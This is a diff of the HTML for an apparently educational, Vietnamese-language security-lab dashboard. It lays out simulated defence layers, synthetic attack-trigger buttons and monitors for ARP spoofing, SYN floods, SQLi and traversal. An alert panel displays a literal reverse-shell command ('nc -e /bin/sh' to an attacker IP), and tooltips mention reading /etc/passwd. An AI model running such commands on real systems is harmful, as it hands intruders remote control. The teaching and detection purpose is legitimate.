-              <button id="btn-toggle-defense-l1" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l1" title="Bật/Tắt Khiên Mạng L1 (Static ARP & iptables)">
-                <span id="defense-l1-btn-text">ENABLE L1</span>
-              </button>
-            </div>
-
-            <!-- LỚP 2: KHIÊN HỆ ĐIỀU HÀNH & NHÂN (L2 - OS/KERNEL) -->
-            <div class="shield-layer-row layer-l2" id="shield-row-l2">
-              <div class="shield-layer-info">
-                <div class="shield-layer-top">
-                  <span class="shield-layer-name">② KHIÊN HĐH (L2 · OS/KERNEL)</span>
-                  <span id="defense-l2-pill" class="pill-inactive">BYPASSED</span>
-                </div>
-                <div class="shield-layer-tech"><code>tcp_syncookies=1</code> · <code>ulimit/cgroups</code> · <code>nologin</code></div>
-              </div>
-              <button id="btn-toggle-defense-l2" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l2" title="Bật/Tắt Khiên Hệ điều hành L2 (Syncookies, ulimit & nologin)">
-                <span id="defense-l2-btn-text">ENABLE L2</span>
-              </button>
-            </div>
-
-            <!-- LỚP 3: KHIÊN ỨNG DỤNG (L3 - APPLICATION L7) -->
-            <div class="shield-layer-row layer-l3" id="shield-row-l3">
-              <div class="shield-layer-info">
-                <div class="shield-layer-top">
-                  <span class="shield-layer-name">③ KHIÊN ỨNG DỤNG (L3 · APP L7)</span>
-                  <span id="defense-l3-pill" class="pill-inactive">UNKNOWN</span>
-                </div>
-                <div class="shield-layer-tech">Prepared SQL · Token Bucket · Input Sanitizer</div>
-              </div>
-              <button id="btn-toggle-defense" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l3" title="Bật/Tắt Khiên Ứng dụng L3/L7">
-                <span id="defense-btn-text">CHECK L3</span>
-              </button>
-            </div>
-
-            <!-- Cờ con L7 (Sub-flags) cho Kiểm thử Chéo -->
-            <div class="l3-subflags-row" aria-label="Cờ con Khiên Ứng dụng L7">
-              <button id="btn-subflag-sqli" class="subflag-chip" title="Toggle Prepared Statements (Chống SQLi)">
-                SQLi: <strong id="subflag-sqli-val">OFF</strong>
-              </button>
-              <button id="btn-subflag-ratelimit" class="subflag-chip" title="Toggle Token Bucket Rate Limiter (Chống Brute-force & Heavy DoS)">
-                RateLimit: <strong id="subflag-ratelimit-val">OFF</strong>
-              </button>
-              <button id="btn-subflag-sanitize" class="subflag-chip" title="Toggle Input Sanitization (Chống Command Injection & Path Traversal)">
-                Sanitizer: <strong id="subflag-sanitize-val">OFF</strong>
-              </button>
-            </div>
           </div>
 
-          <p id="defense-error" role="status" aria-live="polite"></p>
-          <!-- TCP Socket Meters -->
-          <div class="sockets-box">
-            <div class="box-title">TCP METRICS · SIMULATED</div>
-            <div class="socket-grid">
-              <div class="socket-metric">
-                <div class="metric-top">
-                  <span class="metric-label">ESTABLISHED</span>
-                  <span id="metric-established" class="metric-num">12</span>
+          <div class="side-panel-content">
+            <!-- W5-T1: 3-LAYER SHIELD CONTROL PANEL (Flat Protocol Explorer Facts Style) -->
+            <div class="control-box shield-funnel-box" aria-label="Bảng điều khiển 3 Lớp Khiên Chắn">
+              <!-- LỚP 1: KHIÊN MẠNG (L1 - NETWORK L2/L4) -->
+              <div class="shield-layer-row layer-l1" id="shield-row-l1">
+                <div class="shield-layer-info">
+                  <div class="shield-layer-top">
+                    <span class="shield-layer-name">L1 · NETWORK SHIELD</span>
+                    <span id="defense-l1-pill" class="pill-inactive">BYPASSED</span>
+                  </div>
+                  <div class="shield-layer-tech">Static ARP · <code>iptables</code> SYN/RST</div>
                 </div>
-                <div class="meter-bar">
-                  <div id="meter-established-fill" class="meter-fill fill-green" style="width: 25%;"></div>
-                </div>
+                <button id="btn-toggle-defense-l1" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l1" title="Bật/Tắt Khiên Mạng L1 (Static ARP & iptables)">
+                  <span id="defense-l1-btn-text">ENABLE L1</span>
+                </button>
               </div>
 
-              <div class="socket-metric">
-                <div class="metric-top">
-                  <span class="metric-label">SYN_RECV (SYN FLOOD)</span>
-                  <span id="metric-syn-recv" class="metric-num">0</span>
+              <!-- LỚP 2: KHIÊN HỆ ĐIỀU HÀNH & NHÂN (L2 - OS/KERNEL) -->
+              <div class="shield-layer-row layer-l2" id="shield-row-l2">
+                <div class="shield-layer-info">
+                  <div class="shield-layer-top">
+                    <span class="shield-layer-name">L2 · OS &amp; KERNEL</span>
+                    <span id="defense-l2-pill" class="pill-inactive">BYPASSED</span>
+                  </div>
+                  <div class="shield-layer-tech"><code>syncookies=1</code> · <code>ulimit</code> · <code>nologin</code></div>
                 </div>
-                <div class="meter-bar">
-                  <div id="meter-syn-recv-fill" class="meter-fill fill-red" style="width: 0%;"></div>
-                </div>
+                <button id="btn-toggle-defense-l2" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l2" title="Bật/Tắt Khiên Hệ điều hành L2 (Syncookies, ulimit & nologin)">
+                  <span id="defense-l2-btn-text">ENABLE L2</span>
+                </button>
               </div>
 
-              <div class="socket-metric">
-                <div class="metric-top">
-                  <span class="metric-label">TIME_WAIT</span>
-                  <span id="metric-time-wait" class="metric-num">4</span>
+              <!-- LỚP 3: KHIÊN ỨNG DỤNG (L3 - APPLICATION L7) -->
+              <div class="shield-layer-row layer-l3" id="shield-row-l3">
+                <div class="shield-layer-info">
+                  <div class="shield-layer-top">
+                    <span class="shield-layer-name">L3 · APPLICATION (L7)</span>
+                    <span id="defense-l3-pill" class="pill-inactive">UNKNOWN</span>
+                  </div>
+                  <div class="shield-layer-tech">Prepared SQL · RateLimit · Sanitizer</div>
                 </div>
-                <div class="meter-bar">
-                  <div id="meter-time-wait-fill" class="meter-fill fill-yellow" style="width: 15%;"></div>
+                <button id="btn-toggle-defense" class="cyber-btn btn-sm btn-layer-toggle btn-layer-l3" title="Bật/Tắt Khiên Ứng dụng L3/L7">
+                  <span id="defense-btn-text">CHECK L3</span>
+                </button>
+              </div>
+
+              <!-- Cờ con L7 (Sub-flags) -->
+              <div class="l3-subflags-row" aria-label="Cờ con Khiên Ứng dụng L7">
+                <button id="btn-subflag-sqli" class="subflag-chip" title="Toggle Prepared Statements (Chống SQLi)">
+                  SQLi: <strong id="subflag-sqli-val">OFF</strong>
+                </button>
+                <button id="btn-subflag-ratelimit" class="subflag-chip" title="Toggle Token Bucket Rate Limiter (Chống Brute-force & Heavy DoS)">
+                  RateLimit: <strong id="subflag-ratelimit-val">OFF</strong>
+                </button>
+                <button id="btn-subflag-sanitize" class="subflag-chip" title="Toggle Input Sanitization (Chống Command Injection & Path Traversal)">
+                  Sanitizer: <strong id="subflag-sanitize-val">OFF</strong>
+                </button>
+              </div>
+            </div>
+
+            <p id="defense-error" role="status" aria-live="polite"></p>
+
+            <!-- TCP Socket Meters (Flat Protocol Explorer Key-Value Facts) -->
+            <div class="sockets-box">
+              <div class="box-title">TCP SOCKET TELEMETRY</div>
+              <div class="socket-grid">
+                <div class="socket-metric">
+                  <div class="metric-top">
+                    <span class="metric-label">ESTABLISHED</span>
+                    <span id="metric-established" class="metric-num">12</span>
+                  </div>
+                  <div class="meter-bar">
+                    <div id="meter-established-fill" class="meter-fill fill-green" style="width: 25%;"></div>
+                  </div>
+                </div>
+
+                <div class="socket-metric">
+                  <div class="metric-top">
+                    <span class="metric-label">SYN_RECV (HALF-OPEN)</span>
+                    <span id="metric-syn-recv" class="metric-num">0</span>
+                  </div>
+                  <div class="meter-bar">
+                    <div id="meter-syn-recv-fill" class="meter-fill fill-red" style="width: 0%;"></div>
+                  </div>
+                </div>
+
+                <div class="socket-metric">
+                  <div class="metric-top">
+                    <span class="metric-label">TIME_WAIT</span>
+                    <span id="metric-time-wait" class="metric-num">4</span>
+                  </div>
+                  <div class="meter-bar">
+                    <div id="meter-time-wait-fill" class="meter-fill fill-yellow" style="width: 15%;"></div>
+                  </div>
                 </div>
               </div>
             </div>
-          </div>
 
-          <!-- Quick Test Traffic Generator (For Easy Live Demo) -->
-          <div class="demo-tools-box">
-            <div class="box-title">SYNTHETIC LOGS · L2 / L4 / OS / L7 DEMO</div>
-            <div class="demo-btn-group">
-              <button id="btn-demo-ping" class="btn-micro btn-micro-green">Ping Check</button>
-              <button id="btn-demo-user" class="btn-micro btn-micro-cyan">Normal Login</button>
-              <button id="btn-demo-arp" class="btn-micro btn-micro-yellow" title="Giả mạo MAC & Bẻ đường truyền MitM">ARP Spoof (MitM)</button>
-              <button id="btn-demo-syn" class="btn-micro btn-micro-purple" title="Bão gói tin TCP SYN làm vọt biểu đồ SYN_RECV">SYN Flood (L4)</button>
-              <button id="btn-demo-rst" class="btn-micro btn-micro-red" title="Tiêm cờ TCP RST ngắt phiên Client-Server">TCP RST Inject</button>
-              <button id="btn-demo-clean-arp" class="btn-micro btn-micro-green" title="Khôi phục bảng ARP sạch">Restore Clean ARP</button>
-              <button id="btn-demo-sqli" class="btn-micro btn-micro-red" title="Tấn công SQL Injection bypass đăng nhập">SQLi Attack (L7)</button>
-              <button id="btn-demo-bruteforce" class="btn-micro btn-micro-orange" title="Rà quét mật khẩu Brute-Force (Low-rate 1 req/s)">Brute-Force (L7)</button>
-              <button id="btn-demo-revshell" class="btn-micro btn-micro-red" title="OS Command Injection mở Reverse Shell (/bin/sh -> nc)">Reverse Shell (OS)</button>
-              <button id="btn-demo-fd-exhaust" class="btn-micro btn-micro-purple" title="Tấn công làm cạn kiệt File Descriptors (lsof / Fork Bomb)">FD Exhaust (lsof)</button>
-              <button id="btn-demo-traversal" class="btn-micro btn-micro-yellow" title="Khai thác Path Traversal đọc /etc/passwd">Path Traversal</button>
-              <button id="btn-demo-dos" class="btn-micro btn-micro-orange" title="Spam Heavy Report API làm treo CPU">Heavy DoS (L7)</button>
-              <button id="btn-demo-clean-os" class="btn-micro btn-micro-green" style="grid-column: span 2;" title="Ngắt tiến trình Reverse Shell & Khôi phục OS sạch">Kill Reverse Shell &amp; Reset OS</button>
+            <!-- Quick Test Traffic Generator -->
+            <div class="demo-tools-box">
+              <div class="box-title">SYNTHETIC PACKET TRIGGERS</div>
+              <div class="demo-btn-group">
+                <button id="btn-demo-ping" class="btn-micro btn-micro-green">Ping Check</button>
+                <button id="btn-demo-user" class="btn-micro btn-micro-cyan">Normal Login</button>
+                <button id="btn-demo-arp" class="btn-micro btn-micro-yellow" title="Giả mạo MAC & Bẻ đường truyền MitM">ARP Spoof</button>
+                <button id="btn-demo-syn" class="btn-micro btn-micro-purple" title="Bão gói tin TCP SYN làm vọt biểu đồ SYN_RECV">SYN Flood</button>
+                <button id="btn-demo-rst" class="btn-micro btn-micro-red" title="Tiêm cờ TCP RST ngắt phiên Client-Server">TCP RST</button>
+                <button id="btn-demo-clean-arp" class="btn-micro btn-micro-green" title="Khôi phục bảng ARP sạch">Clean ARP</button>
+                <button id="btn-demo-sqli" class="btn-micro btn-micro-red" title="Tấn công SQL Injection bypass đăng nhập">SQLi (L7)</button>
+                <button id="btn-demo-bruteforce" class="btn-micro btn-micro-orange" title="Rà quét mật khẩu Brute-Force (Low-rate 1 req/s)">Brute-Force</button>
+                <button id="btn-demo-revshell" class="btn-micro btn-micro-red" title="OS Command Injection mở Reverse Shell (/bin/sh -> nc)">Reverse Shell</button>
+                <button id="btn-demo-fd-exhaust" class="btn-micro btn-micro-purple" title="Tấn công làm cạn kiệt File Descriptors (lsof / Fork Bomb)">FD Exhaust</button>
+                <button id="btn-demo-traversal" class="btn-micro btn-micro-yellow" title="Khai thác Path Traversal đọc /etc/passwd">Traversal</button>
+                <button id="btn-demo-dos" class="btn-micro btn-micro-orange" title="Spam Heavy Report API làm treo CPU">Heavy DoS</button>
+                <button id="btn-demo-clean-os" class="btn-micro btn-micro-green" style="grid-column: span 3;" title="Ngắt tiến trình Reverse Shell & Khôi phục OS sạch">Kill Reverse Shell &amp; Reset OS</button>
+              </div>
             </div>
           </div>
-        </div>
-      </aside>
+        </aside>
 
+      </div>
     </div>
 
-    <!-- MIDDLE ROW (TASK W3-T1): L2/L4 NETWORK ATTACK VISUALIZATION (ARP CACHE, MITM SNIFFER, SYN_RECV BAR CHART & RST) -->
-    <section class="w3-network-grid" aria-label="L2/L4 Network Attack Monitors">
-      <!-- 1. BẢNG ARP CACHE (/proc/net/arp) -->
-      <div class="card w3-card" id="arp-cache-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">🖧</span> ARP CACHE TABLE <small>(/proc/net/arp)</small>
+    <!-- =========================================================================
+         WORKSPACE VIEW 2: DEEP L2/L4 & OS/L7 TELEMETRY INSPECTOR (6 Panels Tab)
+         ========================================================================= -->
+    <div class="pe-telemetry-stage" id="ws-pane-telemetry">
+      <!-- ROW 1 (TASK W3-T1): L2/L4 NETWORK ATTACK VISUALIZATION -->
+      <section class="w3-network-grid" aria-label="L2/L4 Network Attack Monitors">
+        <!-- 1. BẢNG ARP CACHE (/proc/net/arp) -->
+        <div class="card w3-card" id="arp-cache-card">
+          <div class="card-header">
+            <div class="card-title">
+              ARP CACHE TABLE <small>/proc/net/arp</small>
+            </div>
+            <div class="card-badges">
+              <span id="arp-status-badge" class="badge badge-normal">ARP: VERIFIED</span>
+            </div>
           </div>
-          <div class="card-badges">
-            <span id="arp-status-badge" class="badge badge-normal">ARP: VERIFIED</span>
+          <div class="w3-card-body">
+            <div id="arp-poison-alert" class="arp-alert-box hidden">
+              <strong>MAC SPOOFING DETECTED!</strong> IP Server &amp; Client bị ánh xạ trùng về MAC của Hacker (<code id="spoofed-mac-value">02:42:ac:14:00:42</code>).
+            </div>
+            <table class="arp-table" id="arp-cache-table">
+              <thead>
+                <tr>
+                  <th>NODE</th>
+                  <th>IP ADDRESS</th>
+                  <th>HWADDR (MAC)</th>
+                  <th>IFACE</th>
+                  <th>STATUS</th>
+                </tr>
+              </thead>
+              <tbody id="arp-table-body">
+                <!-- Populated by app.js -->
+              </tbody>
+            </table>
           </div>
         </div>
-        <div class="w3-card-body">
-          <div id="arp-poison-alert" class="arp-alert-box hidden">
-            ⚠️ <strong>MAC SPOOFING DETECTED!</strong> IP Server &amp; Client bị ánh xạ trùng về MAC của Hacker (<code id="spoofed-mac-value">02:42:ac:14:00:42</code>).
-          </div>
-          <table class="arp-table" id="arp-cache-table">
-            <thead>
-              <tr>
-                <th>NODE</th>
-                <th>IP ADDRESS</th>
-                <th>HWADDR (MAC)</th>
-                <th>IFACE</th>
-                <th>STATUS</th>
-              </tr>
-            </thead>
-            <tbody id="arp-table-body">
-              <!-- Populated by app.js -->
-            </tbody>
-          </table>
-        </div>
-      </div>
 
-      <!-- 2. CỬA SỐ SNIFFING BẮT MẬT KHẨU & TOKEN (MITM CREDENTIAL SNIFFER) -->
-      <div class="card w3-card" id="mitm-sniffer-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">🕵️</span> MITM SNIFFER <small>(CREDENTIAL &amp; TOKEN CAPTURE)</small>
-          </div>
-          <div class="card-badges">
-            <span id="sniffer-count-badge" class="badge badge-shield">0 captured</span>
-            <span id="sniffer-status-badge" class="badge badge-shield inactive">STANDBY</span>
-          </div>
-        </div>
-        <div class="w3-card-body sniffer-window" id="mitm-sniffer-list" aria-live="polite">
-          <div class="sniffer-empty">
-            Chưa có gói tin bị bắt lén. Khi <strong>ARP Spoofing (MitM)</strong> kích hoạt, luồng đăng nhập của Client đi vòng qua Hacker sẽ bị bóc tách mật khẩu tại đây.
-          </div>
-        </div>
-      </div>
-
-      <!-- 3. BIỂU ĐỒ CỘT SYN_RECV & GIÁM SÁT TCP RST INJECTION -->
-      <div class="card w3-card" id="syn-rst-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">📊</span> <code>SYN_RECV</code> BACKLOG &amp; TCP RST
-          </div>
-          <div class="card-badges">
-            <span id="syn-backlog-badge" class="badge badge-normal">BACKLOG: STABLE</span>
-          </div>
-        </div>
-        <div class="w3-card-body syn-rst-body">
-          <div class="syn-chart-header">
-            <span>HALF-OPEN QUEUE (<code>SYN_RECV</code>): <strong id="syn-chart-current">0</strong> / 250</span>
-            <span>PEAK: <strong id="syn-chart-peak">0</strong></span>
-          </div>
-          <!-- Vertical Bar Chart for SYN_RECV -->
-          <div class="syn-bar-chart" id="syn-bar-chart" role="img" aria-label="Biểu đồ cột SYN_RECV theo thời gian thực">
-            <!-- 16 vertical bars rendered dynamically -->
-          </div>
-          <!-- TCP RST Injection Status Box -->
-          <div class="rst-status-box" id="rst-status-box">
-            <div class="rst-status-top">
-              <span class="rst-title">⚡ TCP RST INJECTION MONITOR</span>
-              <span id="rst-state-pill" class="badge badge-normal">SESSION: INTACT</span>
+        <!-- 2. CỬA SỐ SNIFFING BẮT MẬT KHẨU & TOKEN (MITM CREDENTIAL SNIFFER) -->
+        <div class="card w3-card" id="mitm-sniffer-card">
+          <div class="card-header">
+            <div class="card-title">
+              MITM CREDENTIAL SNIFFER
             </div>
-            <div class="rst-metrics-row">
-              <span>Disrupted: <strong id="rst-disrupted-count">0</strong></span>
-              <span>Last SEQ#: <code id="rst-last-seq">--</code></span>
-              <span>Time: <code id="rst-last-time">--:--:--</code></span>
+            <div class="card-badges">
+              <span id="sniffer-count-badge" class="badge badge-shield">0 captured</span>
+              <span id="sniffer-status-badge" class="badge badge-shield inactive">STANDBY</span>
             </div>
           </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- WEEK 4 ROW (TASK W4-T1): OS & APPLICATION L7 ATTACK VISUALIZATION (PSTREE, LSOF FD GAUGE, SQLI / BRUTE-FORCE ALERTS) -->
-    <section class="w4-os-l7-grid" aria-label="OS and L7 Security Monitors">
-      <!-- 1. CÂY TIẾN TRÌNH HĐH (PSTREE & REVERSE SHELL DETECTOR) -->
-      <div class="card w4-card" id="pstree-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">🌳</span> OS PROCESS TREE <small>(<code>pstree</code> &amp; Reverse Shell)</small>
-          </div>
-          <div class="card-badges">
-            <span id="pstree-proc-count-badge" class="badge badge-shield">4 procs</span>
-            <span id="pstree-status-badge" class="badge badge-normal">OS: CLEAN</span>
-          </div>
-        </div>
-        <div class="w4-card-body">
-          <div id="revshell-alert-box" class="revshell-alert-box hidden">
-            🚨 <strong>REVERSE SHELL ACTIVE!</strong> Tiến trình con độc hại <code id="revshell-cmd-value">nc -e /bin/sh 172.20.0.66 4444</code> đang mở kết nối ngược từ Server về Hacker!
-          </div>
-          <div class="pstree-container" id="pstree-view" role="tree" aria-label="Cây tiến trình hệ điều hành">
-            <!-- Populated dynamically by app.js -->
-          </div>
-        </div>
-      </div>
-
-      <!-- 2. ĐỒNG HỒ ĐO FILE DESCRIPTORS (LSOF) & OS RESOURCE LIMITS -->
-      <div class="card w4-card" id="fd-gauge-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">📟</span> FILE DESCRIPTORS <small>(<code>lsof</code> / <code>ulimit -n</code>)</small>
-          </div>
-          <div class="card-badges">
-            <span id="fd-status-badge" class="badge badge-normal">FD: NORMAL</span>
-          </div>
-        </div>
-        <div class="w4-card-body fd-gauge-body">
-          <div class="fd-gauge-layout">
-            <!-- SVG Radial Gauge Meter -->
-            <div class="fd-radial-wrapper">
-              <svg class="fd-radial-svg" viewBox="0 0 140 90" aria-label="Đồng hồ đo File Descriptors">
-                <!-- Track Arc -->
-                <path
-                  class="fd-arc-bg"
-                  d="M 15 78 A 55 55 0 0 1 125 78"
-                  fill="none"
-                  stroke-width="12"
-                  stroke-linecap="round"
-                />
-                <!-- Value Fill Arc -->
-                <path
-                  id="fd-arc-fill"
-                  class="fd-arc-fill"
-                  d="M 15 78 A 55 55 0 0 1 125 78"
-                  fill="none"
-                  stroke-width="12"
-                  stroke-linecap="round"
-                  stroke-dasharray="173"
-                  stroke-dashoffset="165"
-                />
-              </svg>
-              <div class="fd-gauge-center">
-                <div class="fd-gauge-pct" id="fd-gauge-percent">4%</div>
-                <div class="fd-gauge-sub"><span id="fd-open-count">42</span> / <span id="fd-max-limit">1024</span></div>
-              </div>
-            </div>
-
-            <!-- Right stats column -->
-            <div class="fd-stats-col">
-              <div class="fd-stat-row">
-                <span class="fd-stat-label">OPEN FDs (<code>lsof</code>):</span>
-                <strong id="fd-stat-open" class="fd-stat-val">42</strong>
-              </div>
-              <div class="fd-stat-row">
-                <span class="fd-stat-label">KERNEL <code>ulimit -n</code>:</span>
-                <strong id="fd-stat-max" class="fd-stat-val">1024</strong>
-              </div>
-              <div class="fd-stat-row">
-                <span class="fd-stat-label">PEAK OPEN FDs:</span>
-                <strong id="fd-stat-peak" class="fd-stat-val">42</strong>
-              </div>
-              <div class="fd-stat-row">
-                <span class="fd-stat-label">ACTIVE PROCS:</span>
-                <strong id="fd-stat-procs" class="fd-stat-val">4</strong>
-              </div>
-            </div>
-          </div>
-
-          <!-- Linear progress bar & sensitive files accessed via lsof/Path Traversal -->
-          <div class="fd-bar-section">
-            <div class="meter-bar fd-linear-bar">
-              <div id="fd-linear-fill" class="meter-fill fill-green" style="width: 4%;"></div>
-            </div>
-            <div class="fd-files-box" id="fd-suspicious-files">
-              <span class="fd-files-label">📂 <code>lsof</code> MONITOR:</span>
-              <code id="fd-files-list">Standard sockets &amp; SQLite WAL descriptors healthy</code>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- 3. BẢNG CẢNH BÁO SQLi / BRUTE-FORCE & TẤN CÔNG TẦNG 7 (L7 ALERTS) -->
-      <div class="card w4-card" id="l7-alerts-card">
-        <div class="card-header">
-          <div class="card-title">
-            <span class="neon-icon">🚨</span> L7 SECURITY ALERTS <small>(SQLi &amp; BRUTE-FORCE)</small>
-          </div>
-          <div class="card-badges">
-            <span id="l7-alert-total-badge" class="badge badge-normal">0 alerts</span>
-          </div>
-        </div>
-        <div class="w4-card-body l7-alerts-body">
-          <!-- Counter Summary Pills -->
-          <div class="l7-counters-bar">
-            <div class="l7-counter-pill pill-sqli">
-              <span class="l7-cnt-label">SQLi</span>
-              <strong id="cnt-sqli">0</strong>
-            </div>
-            <div class="l7-counter-pill pill-bf">
-              <span class="l7-cnt-label">BRUTE-FORCE</span>
-              <strong id="cnt-bruteforce">0</strong>
-            </div>
-            <div class="l7-counter-pill pill-cmd">
-              <span class="l7-cnt-label">CMD INJECT</span>
-              <strong id="cnt-cmd">0</strong>
-            </div>
-            <div class="l7-counter-pill pill-path">
-              <span class="l7-cnt-label">TRAVERSAL</span>
-              <strong id="cnt-traversal">0</strong>
-            </div>
-          </div>
-
-          <!-- Alerts Feed List -->
-          <div class="l7-alerts-list" id="l7-alerts-list" aria-live="polite">
+          <div class="w3-card-body sniffer-window" id="mitm-sniffer-list" aria-live="polite">
             <div class="sniffer-empty">
-              Chưa phát hiện cảnh báo Tầng Ứng dụng (L7). Khi có đòn tấn công <strong>SQL Injection</strong>, <strong>Brute-force Login</strong>, <strong>OS Command Injection</strong> hoặc <strong>Path Traversal</strong>, chi tiết payload sẽ hiển thị tại đây.
+              Chưa có gói tin bị bắt lén. Khi <strong>ARP Spoofing (MitM)</strong> kích hoạt, luồng đăng nhập của Client đi vòng qua Hacker sẽ bị bóc tách mật khẩu tại đây.
             </div>
           </div>
         </div>
-      </div>
-    </section>
 
-    <!-- BOTTOM ROW: PACKET CAPTURE STREAM (TERMINAL LOG TABLE) -->
+        <!-- 3. BIỂU ĐỒ CỘT SYN_RECV & GIÁM SÁT TCP RST INJECTION -->
+        <div class="card w3-card" id="syn-rst-card">
+          <div class="card-header">
+            <div class="card-title">
+              SYN_RECV BACKLOG &amp; TCP RST
+            </div>
+            <div class="card-badges">
+              <span id="syn-backlog-badge" class="badge badge-normal">BACKLOG: STABLE</span>
+            </div>
+          </div>
+          <div class="w3-card-body syn-rst-body">
+            <div class="syn-chart-header">
+              <span>HALF-OPEN (<code>SYN_RECV</code>): <strong id="syn-chart-current">0</strong> / 250</span>
+              <span>PEAK: <strong id="syn-chart-peak">0</strong></span>
+            </div>
+            <div class="syn-bar-chart" id="syn-bar-chart" role="img" aria-label="Biểu đồ cột SYN_RECV theo thời gian thực"></div>
+            <div class="rst-status-box" id="rst-status-box">
+              <div class="rst-status-top">
+                <span class="rst-title">TCP RST INJECTION MONITOR</span>
+                <span id="rst-state-pill" class="badge badge-normal">SESSION: INTACT</span>
+              </div>
+              <div class="rst-metrics-row">
+                <span>Disrupted: <strong id="rst-disrupted-count">0</strong></span>
+                <span>Last SEQ#: <code id="rst-last-seq">--</code></span>
+                <span>Time: <code id="rst-last-time">--:--:--</code></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ROW 2 (TASK W4-T1): OS & APPLICATION L7 ATTACK VISUALIZATION -->
+      <section class="w4-os-l7-grid" aria-label="OS and L7 Security Monitors">
+        <!-- 1. CÂY TIẾN TRÌNH HĐH (PSTREE & REVERSE SHELL DETECTOR) -->
+        <div class="card w4-card" id="pstree-card">
+          <div class="card-header">
+            <div class="card-title">
+              OS PROCESS TREE <small>pstree</small>
+            </div>
+            <div class="card-badges">
+              <span id="pstree-proc-count-badge" class="badge badge-shield">4 procs</span>
+              <span id="pstree-status-badge" class="badge badge-normal">OS: CLEAN</span>
+            </div>
+          </div>
+          <div class="w4-card-body">
+            <div id="revshell-alert-box" class="revshell-alert-box hidden">
+              <strong>REVERSE SHELL ACTIVE!</strong> Tiến trình con độc hại <code id="revshell-cmd-value">nc -e /bin/sh 172.20.0.66 4444</code> đang mở kết nối ngược từ Server về Hacker!
+            </div>
+            <div class="pstree-container" id="pstree-view" role="tree" aria-label="Cây tiến trình hệ điều hành"></div>
+          </div>
+        </div>
+
+        <!-- 2. ĐỒNG HỒ ĐO FILE DESCRIPTORS (LSOF) & OS RESOURCE LIMITS -->
+        <div class="card w4-card" id="fd-gauge-card">
+          <div class="card-header">
+            <div class="card-title">
+              FILE DESCRIPTORS <small>lsof / ulimit -n</small>
+            </div>
+            <div class="card-badges">
+              <span id="fd-status-badge" class="badge badge-normal">FD: NORMAL</span>
+            </div>
+          </div>
+          <div class="w4-card-body fd-gauge-body">
+            <div class="fd-gauge-layout">
+              <div class="fd-radial-wrapper">
+                <svg class="fd-radial-svg" viewBox="0 0 140 90" aria-label="Đồng hồ đo File Descriptors">
+                  <path class="fd-arc-bg" d="M 15 78 A 55 55 0 0 1 125 78" fill="none" stroke-width="12" stroke-linecap="round"/>
+                  <path id="fd-arc-fill" class="fd-arc-fill" d="M 15 78 A 55 55 0 0 1 125 78" fill="none" stroke-width="12" stroke-linecap="round" stroke-dasharray="173" stroke-dashoffset="165"/>
+                </svg>
+                <div class="fd-gauge-center">
+                  <div class="fd-gauge-pct" id="fd-gauge-percent">4%</div>
+                  <div class="fd-gauge-sub"><span id="fd-open-count">42</span> / <span id="fd-max-limit">1024</span></div>
+                </div>
+              </div>
+
+              <div class="fd-stats-col">
+                <div class="fd-stat-row">
+                  <span class="fd-stat-label">OPEN FDs (<code>lsof</code>)</span>
+                  <strong id="fd-stat-open" class="fd-stat-val">42</strong>
+                </div>
+                <div class="fd-stat-row">
+                  <span class="fd-stat-label">KERNEL <code>ulimit -n</code></span>
+                  <strong id="fd-stat-max" class="fd-stat-val">1024</strong>
+                </div>
+                <div class="fd-stat-row">
+                  <span class="fd-stat-label">PEAK OPEN FDs</span>
+                  <strong id="fd-stat-peak" class="fd-stat-val">42</strong>
+                </div>
+                <div class="fd-stat-row">
+                  <span class="fd-stat-label">ACTIVE PROCS</span>
+                  <strong id="fd-stat-procs" class="fd-stat-val">4</strong>
+                </div>
+              </div>
+            </div>
+
+            <div class="fd-bar-section">
+              <div class="meter-bar fd-linear-bar">
+                <div id="fd-linear-fill" class="meter-fill fill-green" style="width: 4%;"></div>
+              </div>
+              <div class="fd-files-box" id="fd-suspicious-files">
+                <span class="fd-files-label">lsof MONITOR:</span>
+                <code id="fd-files-list">Standard sockets &amp; SQLite WAL descriptors healthy</code>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3. BẢNG CẢNH BÁO SQLi / BRUTE-FORCE & TẤN CÔNG TẦNG 7 (L7 ALERTS) -->
+        <div class="card w4-card" id="l7-alerts-card">
+          <div class="card-header">
+            <div class="card-title">
+              L7 SECURITY ALERTS
+            </div>
+            <div class="card-badges">
+              <span id="l7-alert-total-badge" class="badge badge-normal">0 alerts</span>
+            </div>
+          </div>
+          <div class="w4-card-body l7-alerts-body">
+            <div class="l7-counters-bar">
+              <div class="l7-counter-pill pill-sqli">
+                <span class="l7-cnt-label">SQLi</span>
+                <strong id="cnt-sqli">0</strong>
+              </div>
+              <div class="l7-counter-pill pill-bf">
+                <span class="l7-cnt-label">BRUTE-FORCE</span>
+                <strong id="cnt-bruteforce">0</strong>
+              </div>
+              <div class="l7-counter-pill pill-cmd">
+                <span class="l7-cnt-label">CMD INJECT</span>
+                <strong id="cnt-cmd">0</strong>
+              </div>
+              <div class="l7-counter-pill pill-path">
+                <span class="l7-cnt-label">TRAVERSAL</span>
+                <strong id="cnt-traversal">0</strong>
+              </div>
+            </div>
+
+            <div class="l7-alerts-list" id="l7-alerts-list" aria-live="polite">
+              <div class="sniffer-empty">
+                Chưa phát hiện cảnh báo Tầng Ứng dụng (L7). Khi có đòn tấn công <strong>SQL Injection</strong>, <strong>Brute-force Login</strong>, <strong>OS Command Injection</strong> hoặc <strong>Path Traversal</strong>, chi tiết payload sẽ hiển thị tại đây.
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <!-- =========================================================================
+         BOTTOM PANEL: PACKET FLOW (Protocol Explorer Bottom Packet Table + Events)
+         ========================================================================= -->
     <section class="card packet-stream-card">
       <div class="card-header">
         <div class="card-title">
-          <span class="neon-icon">📡</span> HTTP TELEMETRY LOGS
+          PACKET FLOW
           <span id="table-record-count" class="badge badge-normal">0 entries</span>
